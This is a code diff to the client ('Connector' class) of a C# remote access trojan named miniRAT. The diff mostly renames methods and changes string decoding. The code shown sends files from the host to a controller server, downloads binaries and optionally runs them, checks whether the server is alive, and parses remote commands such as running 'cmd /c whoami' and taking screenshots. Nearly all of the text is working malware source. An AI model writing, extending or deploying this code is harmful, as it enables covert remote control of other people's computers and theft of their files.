@@ -1,7 +1,5 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.IO;
-using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 using System.Reflection;
@@ -15,10 +13,11 @@ namespace miniRAT
     /// </summary>
     class Connector
     {
+        //must be same in client and server
+        const string separator = "|||";
         static int clientID = -1;
         static TcpClient tcpClient;
         private static Mutex sendMutex = new Mutex();
-        const string separator = "|||";
 
         public static Boolean ConnectToServer(string []args)
         {
@@ -100,9 +99,10 @@ namespace miniRAT
                 //Decrypt recived data
                 byte[] helloBytes = new byte[byteread];
                 Array.Copy(bytes, helloBytes, byteread);
-                UTF8Encoding UTFEncoder = new System.Text.UTF8Encoding();
-                string helloResponse = UTFEncoder.GetString(helloBytes);
-                
+                //UTF8Encoding UTFEncoder = new System.Text.UTF8Encoding();
+                //string helloResponse = UTFEncoder.GetString(helloBytes);
+                string helloResponse = Encoding.UTF8.GetString(helloBytes);
+
                 string[] stringSeparators = new string[] { separator };
                 //response is like: id<separator>Hello
                 string[] helloArray = helloResponse.Split(stringSeparators, StringSplitOptions.RemoveEmptyEntries);
@@ -113,7 +113,7 @@ namespace miniRAT
             }
             catch  (Exception ex)
             {
-                Console.WriteLine(ex.Message);
+                Console.WriteLine("Cannot connect to server: "+ex.Message);
             }
             return clientSocket;
         }
@@ -125,7 +125,7 @@ namespace miniRAT
         static string sendReciveData(string message)
         {
             if (message != "")
-                sendData(message);
+                SendData(message);
 
             string returndata = "";
             NetworkStream clientStream = tcpClient.GetStream();
@@ -151,8 +151,9 @@ namespace miniRAT
                         //Decrypt recived data
                         byte[] helloBytes = new byte[byteread];
                         Array.Copy(bytes, helloBytes, byteread);
-                        UTF8Encoding UTFEncoder = new System.Text.UTF8Encoding();
-                        returndata = UTFEncoder.GetString(helloBytes);
+                        //UTF8Encoding UTFEncoder = new System.Text.UTF8Encoding();
+                        //returndata = UTFEncoder.GetString(helloBytes);
+                        returndata = Encoding.UTF8.GetString(helloBytes);
                         break;
                     }
 
@@ -175,7 +176,7 @@ namespace miniRAT
         /// Wait for Mutex release and connection open then Encrypt and send text to server
         /// </summary>
         /// <param name="message">Mesage</param>
-        public static void sendData(string message)
+        public static void SendData(string message)
         {
             Boolean sent = false;
 
@@ -194,58 +195,6 @@ namespace miniRAT
             }
         }
         #region File Send and recive
-        /// <summary>
-        /// Listen to UDP port and recive file from server.
-        /// </summary>
-        /// <param name="port"></param>
-        /// <param name="fileName"></param>
-        /// <param name="client"></param>
-        /// <returns></returns>
-        private static string reciveFileUDP(int port, string fileName, TcpClient client)
-        {
-            IPEndPoint ipEnd = new IPEndPoint(IPAddress.Any, port);
-            Socket server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
-
-            try
-            {
-                server.Bind(ipEnd);
-                server.Listen(10);
-
-                Socket serverSocket = server.Accept();
-
-                byte[] bytes = new byte[4096];
-                MemoryStream ms = new MemoryStream();
-
-                int byteread = 0;
-
-                do
-                {
-                    byteread = serverSocket.Receive(bytes, 0, bytes.Length, SocketFlags.None);
-                    ms.Write(bytes, 0, byteread);
-                } while (byteread > 0);
-
-
-                FileStream f = new FileStream(Directory.GetCurrentDirectory() + @"\" + fileName, FileMode.Create);
-                f.Write(ms.ToArray(), 0, ms.ToArray().Length);
-                f.Close();
-
-                Console.WriteLine(fileName + " was recived, and save.");
-
-                return fileName + " was recived, and save.";
-            }
-            catch (Exception ex)
-            {
-
-                Console.WriteLine("Error in recive file: " + ex.Message);
-
-                return "Error in recive file: " + ex.Message;
-            }
-            finally
-            {
-                server.Close();
-            }
-
-        }
 
         /// <summary>
         /// Send file in thread and continue running commands
@@ -254,9 +203,9 @@ namespace miniRAT
         /// <param name="filepath"></param>
         /// <param name="clientSocke"></param>
         /// <returns></returns>
-        private static string giveFileTCPthread(int port, string filepath, TcpClient clientSocke)
+        private static string GiveFileTCPthread(int port, string filepath, TcpClient clientSocke)
         {
-            Thread sthread = new Thread(() => giveFileTCP(port, filepath, clientSocke));
+            Thread sthread = new Thread(() => GiveFileTCP(port, filepath, clientSocke));
             sthread.IsBackground = true;
             sthread.Start();
             return "Client send file: ";//send Send File Start
@@ -267,14 +216,14 @@ namespace miniRAT
         /// <param name="filepath"></param>
         /// <param name="port"></param>
         /// <returns></returns>
-        static void giveFileTCP(int port, string filepath, TcpClient clientSocket)
+        static void GiveFileTCP(int port, string filepath, TcpClient clientSocket)
         {
             string results = "Give file";
             //it's seems use IP not UDP
             FileInfo fi = new FileInfo(filepath);
             if (!fi.Exists)//file don't exists
             {
-                sendData("File dosn't exists: " + filepath);
+                SendData("File dosn't exists: " + filepath);
                 return;
             }
 
@@ -304,7 +253,7 @@ namespace miniRAT
                     fs.Close();
                 if (clientStream != null)
                     clientStream.Close();
-                sendData(results);
+                SendData(results);
             }
         }
         /// <summary>
@@ -315,9 +264,9 @@ namespace miniRAT
         /// <param name="filename"></param>
         /// <param name="run"></param>
         /// <returns></returns>
-        static string getFile(EndPoint server, int port, string filename, Boolean run = false)
+        static string GetFile(EndPoint server, int port, string filename, Boolean run = false)
         {
-            byte[] incomming = getBinary(server, port);
+            byte[] incomming = GetBinary(server, port);
             try
             {
                 if (incomming == null)
@@ -340,7 +289,7 @@ namespace miniRAT
         /// <param name="filename"></param>
         /// <param name="run">If true run binary file, else save file </param>
         /// <returns></returns>
-        static byte[] getBinary(EndPoint server, int port)
+        static byte[] GetBinary(EndPoint server, int port)
         {
             TcpClient client = new TcpClient();
             IPEndPoint ip = (IPEndPoint)server;
@@ -368,7 +317,7 @@ namespace miniRAT
                 clientStream.Close();
                 client.Close();
 
-                //Decrypt recived data
+                //Return recived data
                 return ms.ToArray();
             }
             finally
@@ -377,16 +326,16 @@ namespace miniRAT
         #endregion
         #region Check Server Status
         /// <summary>
-        /// Send AreUAlive to server if no result or incorrect result retuen false.
+        /// Send IsServerAlive to server if no result or incorrect result retuen false.
         /// </summary>
-        /// <returns></returns>
+        /// <returns>IsServerAlive</returns>
         public static Boolean IsServerAlive(TcpClient clientSocket)
         {
             try
             {
                 NetworkStream clientStream = clientSocket.GetStream();
 
-                sendData("AreUAlive");
+                SendData("IsServerAlive");
 
                 int microSecondsTimeOut = 30000000;//30 secound
                 if (clientSocket.Client.Poll(microSecondsTimeOut, SelectMode.SelectRead) == true)//wait for data
@@ -403,8 +352,9 @@ namespace miniRAT
                         //Decrypt recived data
                         byte[] helloBytes = new byte[byteread];
                         Array.Copy(bytes, helloBytes, byteread);
-                        UTF8Encoding UTFEncoder = new System.Text.UTF8Encoding();
-                        string incomming = UTFEncoder.GetString(helloBytes);
+                        //UTF8Encoding UTFEncoder = new System.Text.UTF8Encoding();
+                        //string incomming = UTFEncoder.GetString(helloBytes);
+                        string incomming = Encoding.UTF8.GetString(helloBytes);
                         if (incomming == "IamAlive")
                         {
                             Console.WriteLine(DateTime.Now.ToString() + "  Hoora! Server Is Alive, Continue ");
@@ -434,7 +384,6 @@ namespace miniRAT
         /// <returns>results of command</returns>
         public static string runCommand(TcpClient client, string command)
         {
-
             //Command is like: run<separator>cmd<separator>/c whoami OR screenshot<separator>port OR version
             string[] commandArray = command.Split(new string[] { separator }, StringSplitOptions.None);
 
